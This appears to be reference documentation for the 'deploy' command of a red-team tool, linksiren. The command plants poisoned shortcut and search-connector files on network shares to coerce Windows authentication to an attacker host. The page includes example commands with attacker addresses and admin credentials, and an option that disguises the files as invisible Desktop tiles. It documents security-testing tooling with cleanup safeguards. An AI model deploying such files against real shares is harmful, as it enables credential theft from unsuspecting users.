# Deploy reference

`linksiren deploy` writes poisoned files to UNC paths listed in a targets file (typically the output of `linksiren identify`). The payload type is selected by the filename extension passed to `-n`: `.searchConnector-ms`, `.library-ms`, `.url`, or `.lnk`.

## Required arguments

| Flag | Description |
|---|---|
| `credentials` | `[domain/]user[:password]`. Omit when `--anonymous` is set. See [AUTHENTICATION.md](AUTHENTICATION.md). |
| `-a` / `--attacker` | Attacker IP or hostname embedded in poisoned files as the coercion target. |

## Common options

| Flag | Default | Description |
|---|---|---|
| `-t` / `--targets` | `payload_targets.txt` | Path to a file containing UNC paths (one per line) to folders into which payloads will be deployed. |
| `-n` / `--payload` | `@Test_Do_Not_Remove.searchConnector-ms` | Name of the payload file. Extension selects the payload type. |

## Safety flags

| Flag | Default | Description |
|---|---|---|
| `--force` | off | Overwrite an existing file at the target path. Without this flag, deploy logs a WARNING and skips rather than clobbering real user data with a same-named payload. |
| `--invisible` | off | Prepend `U+200B` (ZERO WIDTH SPACE) to the filename and blank icon references (`<iconReference>` for `.library-ms` / `.searchConnector-ms`, `IconFile=` / `IconIndex=` for `.url`) inside the payload body so the deployed file renders as an unlabeled, transparent tile on a Desktop. Does NOT set `FILE_ATTRIBUTE_HIDDEN`. Hidden files are filtered out of Explorer's enumeration, which breaks the coercion trigger. |
| `--probe-delete` | off | Write a uniquely-named probe file at each target folder and delete it before writing the real payload. Skips the real write if the probe round-trip fails. Avoids leaving undeletable artifacts on shares where the pentester has write but not delete permission. |

## Authentication flags

See [AUTHENTICATION.md](AUTHENTICATION.md) for the full table covering NTLM password, Pass-the-Hash, Kerberos, anonymous (NULL session), and SOCKS-proxy routing.

## Output

* `payloads_written.txt` (current working directory): UNC paths where payloads were successfully written. Used as input to `linksiren cleanup`.

## Cleanup

`linksiren cleanup [creds]` deletes every entry in `payloads_written.txt`. Failures land in `payloads_not_deleted.txt` along with CRITICAL log entries in `linksiren.log`.

## Examples

```bash
# Smallest possible deploy: NTLM password, single target folder, .url payload
linksiren deploy -t targets.txt -a 10.0.0.5 -n test.url ACME/admin:Pass

# Invisible-tile drop on a Desktop using a custom .searchConnector-ms name
linksiren deploy -t desktop-paths.txt -a attacker -n .data.searchConnector-ms --invisible ACME/admin:Pass

# Overwrite an existing payload at a previously-used path
linksiren deploy -t targets.txt -a 10.0.0.5 -n test.url --force ACME/admin:Pass

# Avoid leaving an artifact on shares where you may lack delete permission
linksiren deploy -t targets.txt -a 10.0.0.5 -n test.url --probe-delete ACME/admin:Pass
```
